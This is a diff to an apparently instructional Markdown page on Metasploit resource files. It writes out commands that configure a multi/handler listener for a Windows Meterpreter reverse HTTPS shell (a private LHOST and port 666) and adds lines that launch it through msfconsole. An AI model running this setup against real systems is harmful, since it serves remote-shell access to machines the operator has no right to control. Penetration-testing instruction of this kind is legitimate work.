@@ -63,14 +63,17 @@
 
 <blockquote>In the next example we are going to write one handler resource file</blockquote>
 
-- **Create a resource file using bash terminal prompt (bash)**`[bash prompt]`<br />
+- **Create a resource file using bash terminal prompt**`[bash prompt]`<br />
 
       touch my_resource_file.rc
+
          echo 'use exploit/multi/handler' > my_resource_file.rc
          echo 'set PAYLOAD windows/meterpreter/reverse_https' >> my_resource_file.rc
          echo 'set LHOST 192.168.1.71' >> my_resource_file.rc
          echo 'set LPORT 666' >> my_resource_file.rc
          echo 'exploit' >> my_resource_file.rc
+
+    `[run]` msfconsole -r my_resource_file.rc
 
 - **Create a resource file using the core command 'makerc'**`[metasploit prompt]`<br />
 'maekerc will build a resource file with the settings enter in msfconsole'<br />
@@ -83,6 +86,8 @@
       msf exploit(multi/handler) > exploit
 
       msf exploit(multi/handler) > makerc my_handler.rc
+
+    `[run]` msf > resource /root/my_resource_file.rc
 
 <br />
 
